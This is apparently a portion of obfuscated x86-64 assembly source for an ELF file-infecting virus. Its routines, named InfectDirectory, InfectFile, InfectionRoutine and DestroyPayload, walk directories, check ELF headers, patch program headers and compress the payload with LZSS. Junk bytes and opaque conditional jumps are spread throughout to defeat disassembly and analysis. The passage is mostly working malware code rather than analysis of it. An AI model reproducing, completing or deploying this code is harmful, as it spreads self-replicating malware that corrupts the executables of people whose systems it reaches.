    jmp         $+3
db 0xe3
    jmp         $+4
db 0x9d, 0x8b
    jmp         ..@gCHU9Gf411QI
..@BH6uieDv5kv7:
    mov         DWORD [rdi], eax
    jl          ..@2IJA7I6Ak6mb
    jge         ..@2IJA7I6Ak6mb
..@OR8JNN2SyFvM:
    cmp         eax, 0x3
    jmp         ..@JcDDK1mWGVwF
..@WKd9PGqRLK9s:
    mov         r5, QWORD [r4+rax+p_h.p_vaddr]
    add         r5, QWORD [r4+rax+p_h.p_memsz]
    cmp         r5, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
    js          ..@mLupZgmKjTgX
    jns         ..@mLupZgmKjTgX
..@Cnn1XJnNiGiv:
    mov         [rsp+_LZSSE_OFF.inputaddr], rsi
    jmp         $+5
db 0x7b, 0xd1, 0xf2
    js          ..@gl2kHgEFrlFw
    jns         ..@gl2kHgEFrlFw
..@lvnramomu1Wn:
    xor         rdi, rdi
    xor         rdx, rdx
    jmp         $+5
db 0xe0, 0xba, 0x09
    jmp         $+4
db 0x0f, 0x40
    jmp         $+5
db 0xb3, 0xc5, 0xfb
    jl          ..@OiSDxT7OFdi4
    jge         ..@OiSDxT7OFdi4
..@9wfRcwBlTSYt:
    jmp         ..@IPFTykcEmBz2
    jmp         $+3
db 0x69
    jmp         ..@A6uKe7WTRKLp
..@qbbMubU8uoFF:
    call        InfectDirectory
    jmp         $+5
db 0xcb, 0xb9, 0xc3
    jmp         $+3
db 0xa2
    jmp         $+5
db 0x46, 0x29, 0x96
    jl          ..@AedPqswzp2hU
    jge         ..@AedPqswzp2hU
..@nYqtLqFHP1FY:
    xor         rcx, rcx
    je          ..@GMqnqjvfoYEN
    jne         ..@GMqnqjvfoYEN
..@DTZ02JPB8p1y:
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    jmp         ..@3SzesMT3IeZz
..@EAEjtPEhpE1w:
    xor         rax, rax
    jmp         $+4
db 0xf1, 0x1f
    jmp         $+3
db 0xb5
    jl          ..@lvnramomu1Wn
    jge         ..@lvnramomu1Wn
UnmapFile:
    jmp         ..@XNaPqtR1XVCT
..@i15tJHddmnid:
    mov         QWORD [r2+p_h.p_filesz], r4
    mov         QWORD [r2+p_h.p_memsz], r4
    mov         QWORD [r2+p_h.p_align], PAGE_SIZE
    jmp         $+3
db 0xca
    js          ..@ChW4jPHqPmoV
    jns         ..@ChW4jPHqPmoV
..@o7PWL7QzqQj7:
    jl          ..@EAEjtPEhpE1w
    jmp         $+4
db 0x63, 0x78
    je          ..@7wLwhYtsv8N2
    jne         ..@7wLwhYtsv8N2
..@7phtxoUYOyAd:
    call        Strcpy
    jl          ..@sEKo4s3r97zz
    jge         ..@sEKo4s3r97zz
..@R7zxI4z6eXU9:
    add         WORD [rsp+_LZSSE_OFF.la_index], ax
    add         WORD [rsp+_LZSSE_OFF.w_index], ax
    cmp         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH*2-LOOKAHEAD_LENGTH
    jmp         ..@6WDADubFIjrd
..@gIOxsszB0ST2:
    mov         eax, 0x00
    jmp         $+5
db 0x40, 0xba, 0xac
    jb          ..@sRjlCvl7Cfh8
    jae         ..@sRjlCvl7Cfh8
..@RgjbLOh0hIx0:
    ret
    js          DestroyPayload
    jns         DestroyPayload
..@e5oF455s1hIc:
    jmp         ..@D8W8e4haqHW2
    jmp         $+5
db 0x8c, 0xc9, 0xc3
    jmp         $+5
db 0xf9, 0xdb, 0x10
    js          ..@TM6cOr1OMe9x
    jns         ..@TM6cOr1OMe9x
..@1UnvIoMbSrYs:
    jmp         ..@ahQ1WwtXu1pV
    jmp         $+3
db 0x27
    jmp         $+5
db 0x26, 0x6d, 0x51
    jmp         ..@1yAJcytZ0La4
..@XYhR5bvVvMUj:
    mov         r1, QWORD [r5+file.fileptr]
    mov         r2, QWORD [r5+file.filesize]
    jmp         $+4
db 0x26, 0x09
    jmp         ..@Avbi9cUgx45o
..@RfA6TNgNKJEL:
    mov         rax, 1
    jb          ..@3HdBw3ygj8D1
    jae         ..@3HdBw3ygj8D1
..@wnMMJH0ivhJH:
    xor         rax, rax
    xor         rcx, rcx
    jmp         $+5
db 0xa5, 0x75, 0xf2
    jmp         $+3
db 0x88
    jmp         ..@60FnGAlmelo5
..@XydQyQvy7xw8:
    push        r4
    push        r5
    jmp         $+3
db 0x15
    jmp         $+4
db 0x2c, 0x8e
    jmp         ..@Xx9OqydlkFAG
..@kYcTOF0Cud0Z:
    sub         rsp, _UPDATASIG_OFF_size
    mov         QWORD [rsp+_UPDATASIG_OFF.signaddr], r1
    mov         WORD [rsp+_UPDATASIG_OFF.index], r2w
    je          ..@P1wp0CXKBxsD
    jne         ..@P1wp0CXKBxsD
..@desOkUnl34QS:
    jmp         ..@ZoHcsh2KkIm8
    jmp         ..@U3FUO9R80p6b
..@fD05KcHAHBpP:
    mov         r1, QWORD [rsp+_INFFILE_OFF.file+file.fileptr]
    jl          ..@xp2BOJWgawNq
    jge         ..@xp2BOJWgawNq
..@VJdejkbJF7id:
%ifdef X86_64
    xor         r9, r9
%endif
    jmp         $+5
db 0xb0, 0x7d, 0x43
    jmp         $+3
db 0x42
    jb          ..@BCTqUCUFTDvy
    jae         ..@BCTqUCUFTDvy
..@JeUwRCSIIeqc:
    cmp         rax, r2
    jne         ..@1yAJcytZ0La4
    jb          ..@y4T34efnqAEB
    jae         ..@y4T34efnqAEB
..@t1FubvTC2j8s:
    test        rax, rax
    jnz         ..@D8W8e4haqHW2
    jl          ..@fGAz4qQWGTeE
    jge         ..@fGAz4qQWGTeE
..@LbTyJDnr5h7k:
    jne         ..@G0YwH0Y78FlN
    jmp         ..@3O6gkc9MlacU
..@kMKiMN0174bj:
    cmp         DWORD [r2+rax], PT_NOTE
    jne         ..@fCjkWJEANPMM
    jmp         $+3
db 0x62
    je          ..@iuezeTQbEIDc
    jne         ..@iuezeTQbEIDc
..@Z2mvgtsjU0Os:
    jne         ..@jA95S8yFo8Np
    cmp         BYTE [r1+16], ET_EXEC
    je          ..@fGAz4qQWGTeE
    jmp         $+4
db 0x18, 0xdb
    js          ..@Parta2RfKnjH
    jns         ..@Parta2RfKnjH
..@A9d25z6mGTNg:
    mul         rbx
    mov         rdi, QWORD [rsp+_DYNPIE_OFF.sh_ptr]
    add         rdi, rax
    jb          ..@P1RmMPSxaAw1
    jae         ..@P1RmMPSxaAw1
..@D8W8e4haqHW2:
    xor         rax, rax
    jb          ..@7wnI0rGD0kJc
    jae         ..@7wnI0rGD0kJc
..@BqSpqGT3bQPr:
    mov         r1w, WORD [rsp+_UPDATASIG_OFF.index] 
    je          ..@CwBYjYi6jSYJ
    jne         ..@CwBYjYi6jSYJ
..@SX9BUu918rsl:
    add         QWORD [rsp+_INFDIR_OFF.dirindex], rax
    jmp         ..@qhPfdvIlZRJV
..@SplDbycgaUEo:
    mov         r1, m6
    jmp         $+3
db 0xda
    je          ..@McnPsvxoKZqj
    jne         ..@McnPsvxoKZqj
..@GkfUFciLgzLF:
    cmp         rax, 0x00
    jl          ..@F76KGCx60c52
    js          ..@7YAfvQYfgtM9
    jns         ..@7YAfvQYfgtM9
..@v9bA5dmltWno:
    jle         ..@qbVFHOrRPJJB
    jmp         ..@rY29WNpG0rJs
..@e8RGltXNanrV:
    cmp         BYTE [rsp+_LZSSE_OFF.character], al
    jmp         $+4
db 0xad, 0x02
    jb          ..@LbTyJDnr5h7k
    jae         ..@LbTyJDnr5h7k
..@gWxR6ZvWflWa:
    mov         dx, WORD [rsp+_LZSSE_OFF.la_index]
    jmp         $+3
db 0x98
    jmp         ..@Rzohv0E50cIf
..@ROmVVoPa3LZK:
    jnz         ..@OGFSlbAS5O53
    jmp         ..@HD2Y46h4tyee
..@5WdWuObNs37G:
    cmp         cl, 0x4
    jb          ..@B3MS1q73W8D7
    jae         ..@B3MS1q73W8D7
..@rY29WNpG0rJs:
    push        r1
    jmp         ..@gfzqCff7mEHq
..@fImuY1NlsdYe:
    lea         r1, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    cmp         BYTE [r1], '.'
    jmp         $+5
db 0x40, 0x2a, 0xe0
    jb          ..@pjjqNEI3U5x3
    jae         ..@pjjqNEI3U5x3
..@7wLwhYtsv8N2:
    cmp         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    je          ..@d7ZOqOSecWLH
    jmp         $+5
db 0x4c, 0x06, 0xc6
    jmp         $+3
db 0x19
    jmp         ..@qG6hfnmkj5gR
..@lwqI45L5V4OS:
    rep         movsb
    cld
    jmp         ..@ljGEncg3Zzqr
    jmp         ..@HyLnKb7NX8zU
..@U0RPo8LWRpqF:
    mov         r2, r5
    jmp         $+3
db 0x08
    jmp         $+5
db 0x27, 0x9e, 0x04
    jmp         $+5
db 0x49, 0x25, 0x10
    je          ..@Tu1xcVTEFmuj
    jne         ..@Tu1xcVTEFmuj
..@VSqyVn1X4nS0:
    and         r2, 0x00ffffff
    cmp         r2d, '../'
    je          ..@WEitd0rgpwXf
    js          ..@61oWrVSszhST
    jns         ..@61oWrVSszhST
..@u8FtkbA41fDw:
    lea         r1, QWORD [rsp+_INFFILE_OFF.file]
    jmp         ..@vHbf07EvFTmx
..@IHPiI7ey9H2y:
    mov         r2, m6
    jmp         $+3
db 0xee
    jmp         $+5
db 0x13, 0x3d, 0xd1
    jmp         $+4
db 0xfa, 0x12
    js          ..@fD05KcHAHBpP
    jns         ..@fD05KcHAHBpP
..@6bt4K09sUjfQ:
    mov         r1, r5
    jb          ..@xhTDIe4iNIyv
    jae         ..@xhTDIe4iNIyv
..@V8SknNDb4R2V:
    mov         eax, SYS_MUNMAP
    js          ..@TVbhGC2FQQDg
    jns         ..@TVbhGC2FQQDg
..@XNaPqtR1XVCT:
    push        r1
    mov         r5, r1
    xor         rax, rax
    js          ..@XYhR5bvVvMUj
    jns         ..@XYhR5bvVvMUj
Strcpy:
    jmp         ..@9u9eh7vHvpGG
..@d7GvsyAHLogR:
    call        DYNPIEValidation
    jb          ..@t1FubvTC2j8s
    jae         ..@t1FubvTC2j8s
..@zzr48W0aLlow:
    mov         r2, m8
    mov         r3, original_virus_len-non_packed_len
    jb          ..@hQdFsp4FPpcG
    jae         ..@hQdFsp4FPpcG
..@hm6acdKwHkpT:
    movzx       r3, WORD [r1+e_h.e_phentsize]
    jmp         $+5
db 0x51, 0xda, 0x71
    jl          ..@xnsdNi58hWbm
    jge         ..@xnsdNi58hWbm
..@CN8MS7JN1NqH:
    call        InfectDirectory
    jmp         $+3
db 0xe2
    jmp         $+4
db 0x1b, 0xc7
    jmp         ..@tPaFdmWgSL77
..@hHq4BMdwUQzI:
    mov         rsi, rdi
    jmp         $+5
db 0xdc, 0xf6, 0x67
    jmp         ..@3bARibDlxqp5
..@zRYdmRoopdYh:
    mov         QWORD [rsp+_PROC_OFF.dirindex], 0x00
    xor         r4, r4
    jl          ..@hqrVdOrH505b
    jge         ..@hqrVdOrH505b
..@vUnR00uVWauc:
    syscall
    xor         r1, r1
    CFILE       DWORD [r5+file.filefd]
    js          ..@Bn559XmHSLxc
    jns         ..@Bn559XmHSLxc
..@t69ZTCB0OKq9:
%ifdef X86_64
    xor         rdi, rdi
    xor         rdx, rdx
    xor         r9, r9
%endif
    jmp         $+5
db 0x99, 0x7e, 0x64
    jl          ..@aSlnyin0pEDd
    jge         ..@aSlnyin0pEDd
..@DvTDASZVDBNW:
    mov         r4d, DWORD [r1 + file.filefd]
    je          ..@zFGIOHy6tcRH
    jne         ..@zFGIOHy6tcRH
..@bzmppiWkxZgV:
    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
    jmp         $+4
db 0xf4, 0xe6
    jmp         ..@PrxdceW9p37K
..@a6V9XKfWUJWz:
    sub         r5, 1
    jmp         $+3
db 0xc9
    jmp         $+3
db 0xd0
    jmp         $+5
db 0x01, 0xa0, 0x69
    jb          ..@mIYzDwdoZw2p
    jae         ..@mIYzDwdoZw2p
..@CNwOIoZKLpPC:
    rep         movsb
    xor         rax, rax
    xor         r1, r1
    jmp         $+3
db 0xc7
    jmp         $+3
db 0xa4
    jmp         ..@BqSpqGT3bQPr
..@xp2BOJWgawNq:
    add         r1, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
    jl          ..@11n8Gn6vz60J
    jge         ..@11n8Gn6vz60J
..@JNzVAcAD8nj1:
    mov         rax, rdi
    ret
    jmp         $+4
db 0xc8, 0x1f
    jl          IsNum
    jge         IsNum
..@CMGBtwoLqDKC:
    add         rsp, _INFDIR_OFF_size
    ret
    jmp         $+3
db 0x33
    jmp         InfectFile
..@ZiIJKTQUJBn2:
    add         rsp, _PROC_OFF_size
    jmp         InfectionRoutine
..@DSdRqA8znBnF:
    mov         r1, [rsp+_INFFILE_OFF.file+file.fileptr]
    jmp         $+4
db 0x61, 0xba
    jl          ..@QnHXIhhqtrZm
    jge         ..@QnHXIhhqtrZm
..@CI5IPBii6I5g:
    mov         r2, QWORD [r1+file.filename]
    jmp         $+4
db 0xfb, 0xd1
    jmp         ..@Fb2tLZKilndv
..@A0SsorrEBmWq:
    call        DestroyPayload
    jmp         $+3
db 0xd2
    jmp         $+5
db 0x4f, 0xb4, 0x3d
    jmp         $+4
db 0xee, 0x22
    jmp         $+3
db 0x59
    jl          ..@qbVFHOrRPJJB
    jge         ..@qbVFHOrRPJJB
..@SlGIYXiGKMzm:
    jnz         ..@D8W8e4haqHW2
    jb          ..@6bt4K09sUjfQ
    jae         ..@6bt4K09sUjfQ
..@bhVwtUIke60Z:
%ifdef X86_32
    mov         esi, 0x22
%endif
    jl          ..@Ov2zxCBYKZ8l
    jge         ..@Ov2zxCBYKZ8l
..@oP2M9Embt3Jv:
    mov         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
    jmp         $+5
db 0x17, 0x32, 0xf0
    jmp         ..@GLFq4K2b5hyz
..@je5ZqGAqnlCO:
    cmp         rax, (-1)
    je          ..@eIbzLHb1XxwN
    xor         r3, r3
    jl          ..@7esXEuQ13G9Y
    jge         ..@7esXEuQ13G9Y
..@N0Zyz5EXYjCS:
    rep         movsb
    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], rsi
    jmp         $+3
db 0x87
    jmp         $+3
db 0x07
    js          ..@UhGi1D2Kbk7C
    jns         ..@UhGi1D2Kbk7C
..@WxnxR0oVoRCv:
    xor         r4, r4
    mov         rax, SYS_WAIT4
    syscall
    jmp         $+5
db 0xc1, 0x8c, 0xd6
    jmp         $+3
db 0xc2
    jmp         ..@IexbbH58HbLf
..@lHliXbJvN7TY:
%ifdef X86_64
    xor         rax, rax
    xor         rdi, rdi
    xor         rdx, rdx
%endif
    js          ..@VJdejkbJF7id
    jns         ..@VJdejkbJF7id
..@SJp758yQ9DS9:
    cmp         BYTE [r1], 0x00
    jmp         ..@ijCo8vmxBOOJ
..@I3aPZUf1fnkW:
    mul         r2
    add         rax, r1
    js          ..@t5DXKKEr72Ce
    jns         ..@t5DXKKEr72Ce
..@1deZsL5Q29tR:
    jmp         ..@ZoHcsh2KkIm8
    jmp         $+4
db 0x1a, 0xaa
    jmp         ..@MEgy9b2de9UC
..@UcntzVZ7xGsd:
%ifdef X86_32
    mov         esi, 0x01
    mov         edi, DWORD [edi+file.filefd]
    push        ebp
%endif
    jmp         $+3
db 0xe9
    js          ..@QooXBOs6BP9x
    jns         ..@QooXBOs6BP9x
..@7Owyev8sflLt:
    VAR         packed, procs
    jmp         $+4
db 0x45, 0xf3
    je          ..@N1E40XH55Ri0
    jne         ..@N1E40XH55Ri0
..@YEDpJL2PgITe:
    sub         dl, cl
    cmp         dl, BYTE [rsp+_LZSSE_OFF.match_len]
    jle         ..@G0YwH0Y78FlN
    jmp         $+4
db 0x9b, 0x4f
    jmp         $+5
db 0xc4, 0x7d, 0xa7
    jb          ..@sAigFkl1Lo6U
    jae         ..@sAigFkl1Lo6U
..@sUg1q5IB4ooc:
    test        ax, ax
    jmp         ..@WPYVmdZIf3ws
..@WPYVmdZIf3ws:
    jz          ..@azqWxJG15B8f
    jmp         $+4
db 0xa5, 0xa9
    jb          ..@ygmbdTKTv0Vm
    jae         ..@ygmbdTKTv0Vm
..@45WjZTC25Goy:
    movzx       r3, WORD [r1+e_h.e_phentsize]
    jmp         $+3
db 0x0b
    jl          ..@l2jOqOYhVapL
    jge         ..@l2jOqOYhVapL
..@kCN9Ugyrtzbx:
    xor         rbx, rbx
    jmp         $+4
db 0x17, 0xa9
    jmp         ..@MR9gxjaPVDGg
..@J8NZZlFxkfj4:
    xor         rcx, rcx
    jmp         $+5
db 0x4d, 0x1c, 0x0a
    jmp         ..@49zcKvbio6Sf
..@FiWyyLyeUpyJ:
    mov         eax, 1
    ret
    jmp         Strcpy
..@Eg3N1gAUSoVg:
    sub         rsp, _PAYLOAD_OFF_size
    jmp         ..@XJ5ibbxEyNyF
..@gDiTMfTK494w:
    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    jmp         $+5
db 0xa1, 0xfa, 0x73
    jmp         ..@2pIalt5S7lvR
..@TM6cOr1OMe9x:
    mov         r1, QWORD [r5+file.fileptr]
    je          ..@5IO4xegQ1k0N
    jne         ..@5IO4xegQ1k0N
..@ohFSS2V8ElbL:
    mov         r1, m6
    jmp         $+3
db 0xb4
    js          ..@zGP0FqIWDGhH
    jns         ..@zGP0FqIWDGhH
..@l2jOqOYhVapL:
    mul         r3 
    jl          ..@WKd9PGqRLK9s
    jge         ..@WKd9PGqRLK9s
..@ofdqhn1NQ0Gk:
    push        r4
    jmp         ..@K1QZ17h52KKl
..@RgaO5zTohTzS:
    sub         r2, 1
    jmp         $+4
db 0x7c, 0xc4
    jmp         ..@Te6otUElfohC
..@g1f6rOB2R8cC:
    call        AddSizeMappedFile
    cmp         rax, (-1)
    je          ..@A0SsorrEBmWq
    jb          ..@shwe8m0fFbJL
    jae         ..@shwe8m0fFbJL
..@7wnI0rGD0kJc:
    ret
    je          NonBinaryFile
    jne         NonBinaryFile
..@CST76KrA8vyS:
    add         rsp, _NBF_OFF_size
    jmp         $+4
db 0xcc, 0xfe
    jmp         $+3
db 0xdd
    je          ..@Vnf1GlqQBJYH
    jne         ..@Vnf1GlqQBJYH
..@JT3iZI4UH3X1:
    mov         [r1], rax
    jmp         $+4
db 0x60, 0x6f
    jmp         ..@tozUcuzmm8QT
..@vJwcwzdTK3fe:
    xor         rcx, rcx
    mov         rdi, m7
    mov         ecx, PADDING
    jmp         $+4
db 0x3b, 0xcd
    jmp         ..@gIOxsszB0ST2
..@0tE5rJesnqyf:
    mov         ax, WORD [r1+linux_dirent.d_reclen]
    jmp         $+4
db 0xbc, 0x4c
    jl          ..@oIUDBxORBNW3
    jge         ..@oIUDBxORBNW3
..@43hnsLqgWWf9:
    add         eax, 0x57
    jmp         $+3
db 0xfc
    jmp         ..@mB2MM6GP7vAz
..@3SzesMT3IeZz:
    add         rdi, _signature.index-_signature.start
    jmp         ..@BH6uieDv5kv7
..@0BZ07R9KLmUE:
    rep         movsb
    jmp         $+3
db 0x42
    jmp         $+5
db 0x42, 0xc8, 0x1c
    js          ..@Cnn1XJnNiGiv
    jns         ..@Cnn1XJnNiGiv
..@7YAfvQYfgtM9:
    xor         r4, r4
    jmp         $+3
db 0xba
    jl          ..@7Owyev8sflLt
    jge         ..@7Owyev8sflLt
..@XMTy8Rq9qc7m:
    mov         rcx, signature_len
    jmp         $+3
db 0x01
    js          ..@VPaOqskehpTO
    jns         ..@VPaOqskehpTO
..@6DSZISOsgeyW:
    cmp         BYTE [r1], 0x30
    jl          ..@gBsMpprcPZcB
    js          ..@pak0nsKn44uG
    jns         ..@pak0nsKn44uG
..@jh2Bn1eeLHOS:
    mov         r3, [r1+e_h.e_phoff]
    lea         r4, [r1]
    jl          ..@uAZwZ6TqHkyP
    jge         ..@uAZwZ6TqHkyP
..@MrvJPtpif7uS:
    xor         rax, rax
    mov         ax, WORD [rsp+_LZSSE_OFF.la_index]
    add         rdi, rax
    jmp         $+4
db 0xc5, 0x98
    jmp         ..@vsbPHyp6RcDU
..@Te6otUElfohC:
    mov         rax, r2
    jmp         $+3
db 0x45
    jl          ..@45WjZTC25Goy
    jge         ..@45WjZTC25Goy
DYNPIEValidation:
    jmp         ..@xnwbDvuCssKC
..@eGh2d3OWPitd:
    jmp         ..@KePuDDyRgcqU
    jmp         $+3
db 0xad
    jmp         ..@A0SsorrEBmWq
..@XgzoogokTL1t:
    sub         rsp, _INFDIR_OFF_size
    js          ..@jXYUOKOrRYZW
    jns         ..@jXYUOKOrRYZW
..@jaxQfsxvgq6y:
    cmp         rax, 0x0
    jle         ..@0ZJhPPfp2Lwz
    mov         rax, rsp
    jmp         $+5
db 0xc8, 0x19, 0x59
    jmp         $+3
db 0x8f
    jmp         ..@Qei8xRzRGjOX
..@Tc7G10263bVq:
    mov         eax, SYS_MREMAP
    syscall
    jmp         $+3
db 0xb6
    js          ..@uOxu5wu8Ukbi
    jns         ..@uOxu5wu8Ukbi
..@22HZkkzW0F0O:
    ret
    js          AddSizeMappedFile
    jns         AddSizeMappedFile
NonBinaryFile:
    jmp         ..@VKcQMqRRkEhk
..@n1EnFDLeCICk:
    je          ..@qbVFHOrRPJJB
    mov         r4, m7
    sub         r4, m6
    jmp         ..@MUC4tP1ut4tF
..@3Ld6APQ59pdT:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    jl          ..@hHq4BMdwUQzI
    jge         ..@hHq4BMdwUQzI
..@JcDDK1mWGVwF:
    jle         ..@KfARbzWo7a7L
    jmp         ..@86HzY8FxXNGv
..@22fF8NsJYL72:
%ifdef X86_64
    mov         r8d, DWORD [r8+file.filefd]
%endif
    jmp         $+3
db 0xc7
    jmp         $+5
db 0x51, 0x75, 0x6b
    jmp         $+3
db 0xe3
    jmp         $+4
db 0x21, 0x4f
    je          ..@WZFxm8wXMoff
    jne         ..@WZFxm8wXMoff
..@hrD02y14laZ6:
    mov         QWORD m5, 0x01
    jmp         $+4
db 0x10, 0xd5
    je          ..@bhcJQzQUY5NB
    jne         ..@bhcJQzQUY5NB
..@mzijMClEcB55:
    mov         QWORD [rsp+_LZSSE_OFF.length], r2
    jmp         ..@OeT39gQVTvsA
..@cEJ4vrpHbyJs:
    mov         r1, QWORD [r5+file.filesize]
    cmp         r1, e_h_size
    jmp         $+3
db 0x6b
    jmp         ..@2XeldRTDdmIZ
..@kNQwz7wgWnzl:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    js          ..@wgRZQWV41wu9
    jns         ..@wgRZQWV41wu9
..@zV4T2ybxKG7u:
    pop         r2
    jmp         $+3
db 0xd7
    jl          ..@9tWINjEBNfak
    jge         ..@9tWINjEBNfak
..@YrKxFkn2gEUC:
    syscall
    cmp         eax, 0x0
    jmp         ..@XyRPEYCE91cI
..@29QFonJzP6l5:
%ifdef X86_64
    xor         rax, rax
%endif
    jmp         $+4
db 0x1e, 0xb8
    jmp         $+4
db 0x39, 0xa9
    js          ..@t69ZTCB0OKq9
    jns         ..@t69ZTCB0OKq9
..@5FgopFvOxVhL:
    test        eax, eax
    jnz         ..@U3FUO9R80p6b
    jmp         $+5
db 0xb5, 0xe8, 0x1a
    je          ..@S7ozA98wTS63
    jne         ..@S7ozA98wTS63
..@3W7qpd8Z83xD:
    ret
    jmp         $+3
db 0x07
    jmp         IsELFComplete
..@gPtLHAgifm5y:
    sub         rcx, rax
    jmp         $+4
db 0x02, 0x07
    jb          ..@gXTp8J2VwzrC
    jae         ..@gXTp8J2VwzrC
..@ALDpThzJGsXW:
    je          ..@EMN8AcMIGzf6
    mov         rax, SYS_FORK
    syscall
    jmp         ..@K4mPBaLgRhAP
..@FsGmoGbf3Rvs:
    cmp         BYTE [rsp+_INFDIR_OFF.depth], SUBDIR_MAXDEPTH
    jge         ..@WEitd0rgpwXf
    jmp         $+4
db 0xe3, 0x8b
    jmp         $+5
db 0x43, 0xc1, 0x49
    je          ..@fImuY1NlsdYe
    jne         ..@fImuY1NlsdYe
..@4ofg8qU2JwLU:
    xor         r2, r2
    jmp         $+5
db 0xe0, 0x05, 0x60
    jmp         $+5
db 0x57, 0x84, 0x09
    jmp         $+4
db 0x5e, 0xbe
    jmp         ..@Z2XDQwZoDjWb
..@d7ZOqOSecWLH:
    mov         rax, QWORD [rsp+_LZSSE_OFF.outputaddr]
    jmp         ..@MxK1s5FVAmr0
..@dzK0HcBQiYib:
    add         rsp, _INFFILE_OFF_size
    jmp         $+5
db 0x52, 0x50, 0x68
    jmp         $+4
db 0x3c, 0x05
    jl          ..@ylOazURaUjal
    jge         ..@ylOazURaUjal
..@HP0C6HRAFgvT:
    xor         r2, r2
    je          ..@ohFSS2V8ElbL
    jne         ..@ohFSS2V8ElbL
..@gXTp8J2VwzrC:
    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
    jb          ..@kNQwz7wgWnzl
    jae         ..@kNQwz7wgWnzl
..@6M0Wf4H1tDJG:
    xor         rbx, rbx
    mov         al, BYTE [rdi]
    mov         BYTE [rsp+_LZSSE_OFF.character], al
    jmp         $+4
db 0x77, 0x31
    jb          ..@66ylDtB6jmT0
    jae         ..@66ylDtB6jmT0
..@xRIvUMhNqUoo:
    mov         QWORD [r5+file.fileptr], 0x00
    jmp         $+5
db 0x54, 0x3c, 0xb4
    jb          ..@ShJzHEZS1cV9
    jae         ..@ShJzHEZS1cV9
GetNewProgramVaddr:
    jmp         ..@qBq32oM9to02
..@xhTDIe4iNIyv:
    call        IsELFComplete
    test        al, al
    jnz         ..@D8W8e4haqHW2
    jmp         ..@pgA709t4in93
..@nxRTYKWHuF7m:
    mov         r1d, eax
    mov         r3d, 0x02
    jmp         $+3
db 0xfc
    jmp         $+3
db 0xff
    jmp         ..@2drQ9p7E6X5B
..@61oWrVSszhST:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    je          ..@KlNOXnMdo87d
    jne         ..@KlNOXnMdo87d
..@uwxKrVBQDhN6:
%ifdef X86_32
    mov         eax, SYS_MMAP2
%endif
    jmp         $+4
db 0x68, 0x4d
    jmp         ..@BdoninL6gN3e
..@dMAPu8k6x47E:
    add         rbx, 1
    jmp         ..@TvMJCMdpgnEa
..@GVARjriEyAwl:
    ret
    je          LzssEncoder
    jne         LzssEncoder
..@sUr0RrIHstJM:
    mov         rax, (-1)
    jb          ..@oHIWO5kEZcF0
    jae         ..@oHIWO5kEZcF0
..@mB2MM6GP7vAz:
    and         eax, 0xff
    or          edi, eax
    jl          ..@UVSkO7x8JyUf
    jge         ..@UVSkO7x8JyUf
..@GLB3t6qri8pG:
    CFILE       DWORD [r5+file.filefd]
    jmp         $+3
db 0xbd
    js          ..@sUr0RrIHstJM
    jns         ..@sUr0RrIHstJM
..@PrxdceW9p37K:
    call        Strcpy
    mov         BYTE [r1], '/'
    add         r1, 1
    jmp         $+5
db 0x6a, 0x07, 0xf6
    jmp         ..@gC6RsNZRLLGA
..@OGFSlbAS5O53:
    shr         edx, 1
    test        edx, edx
    js          ..@cYhaOLjkZyAK
    jns         ..@cYhaOLjkZyAK
..@VPaOqskehpTO:
    mov         rdi, QWORD [r5+file.fileptr]
    js          ..@fI31wiUR2vQB
    jns         ..@fI31wiUR2vQB
..@K1WfYjby1O54:
    mov         r3, rax
    jmp         $+4
db 0x95, 0xea
    jb          ..@W2UfFxmvexhl
    jae         ..@W2UfFxmvexhl
..@EJi78zNPQO7z:
    ret
..@W2UfFxmvexhl:
    call_vsp    Strncmp
    js          ..@sUg1q5IB4ooc
    jns         ..@sUg1q5IB4ooc
..@1yAJcytZ0La4:
    mov         rax, 1
    jmp         $+5
db 0x22, 0x7e, 0xc3
    jl          ..@ahQ1WwtXu1pV
    jge         ..@ahQ1WwtXu1pV
..@LWIEUvrIaxC1:
    or          BYTE [rsp+_LZSSE_OFF.bits], al
    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
    jmp         $+3
db 0x21
    jb          ..@xYtIeE7XxXSy
    jae         ..@xYtIeE7XxXSy
FileValidation:
    jmp         ..@tMyJH0mFl8ni
..@P1wp0CXKBxsD:
    GGLOBAL     _signature.start
    mov         rsi, r5
    jmp         ..@2ZI4rapZ6Q2S
..@nGUCZPSAwbYJ:
    jz          ..@KfARbzWo7a7L
    jmp         ..@gZV35taYeXBj
..@rjXvEc6kRPig:
%ifdef X86_32
    xor         eax, eax
    xor         ebx, ebx
%endif
    jmp         $+3
db 0xe0
    jmp         ..@7TilgAxD9PcL
..@4u15ZC2xp2bv:
    je          ..@6BQtE1pc1e3n
    jl          ..@O2rTnA0gScMQ
    jge         ..@O2rTnA0gScMQ
..@qPqkhcyC8QIp:
    mov         ecx, (WINDOW_LENGTH+LOOKAHEAD_LENGTH)
    jmp         ..@u2TNxEAnbzVI
..@P1RmMPSxaAw1:
    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
    jmp         ..@QuVmrOi1XL4b
..@ZTVhtnUqFMxK:
    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer+WINDOW_LENGTH-LOOKAHEAD_LENGTH]
    jmp         $+5
db 0x61, 0x91, 0x18
    jmp         ..@JOimcqgVq9so
..@Rzohv0E50cIf:
    add         rsi, rdx
    mov         cl, BYTE [rsp+_LZSSE_OFF.cmp_len]
    add         ecx, 1
    je          ..@7FNzJkayGXPK
    jne         ..@7FNzJkayGXPK
..@2EZz8kUDws68:
    call        UnmapFile
    mov         r2, 11b
